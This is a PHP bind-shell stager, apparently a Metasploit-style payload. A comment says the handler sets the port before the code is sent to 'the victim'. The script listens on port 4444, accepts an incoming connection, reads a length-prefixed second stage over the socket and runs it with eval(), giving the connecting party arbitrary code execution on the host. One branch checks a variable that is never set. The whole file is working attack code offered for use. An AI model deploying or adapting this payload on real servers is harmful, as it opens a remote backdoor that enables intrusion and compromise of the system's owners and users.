#<?php

# The payload handler overwrites this with the correct LPORT before sending
# it to the victim.
$port = 4444;
$ipaddr = "0.0.0.0";

if (is_callable('stream_socket_server')) {
	$srvsock = stream_socket_server("tcp://{$ipaddr}:{$port}");
	if (!$srvsock) { die(); }
	$s = stream_socket_accept($srvsock, -1);
	fclose($srvsock);
	$s_type = 'stream';
} elseif (is_callable('socket_create_listen')) {
	$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
	if (!$res) { die(); }
	$s = socket_accept($srvsock);
	socket_close($srvsock);
	$s_type = 'socket';
} elseif (is_callable('socket_create')) {
	$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	$res = socket_bind($srvsock, $ipaddr, $port);
	if (!$res) { die(); }
	$s = socket_accept($srvsock);
	socket_close($srvsock);
	$s_type = 'socket';
} else {
	die();
}
if (!$s) { die(); }

switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
	# We failed on the main socket.  There's no way to continue, so
	# bail
	die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
	switch ($s_type) {
	case 'stream': $b .= fread($s, $len-strlen($b)); break;
	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
	}
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();
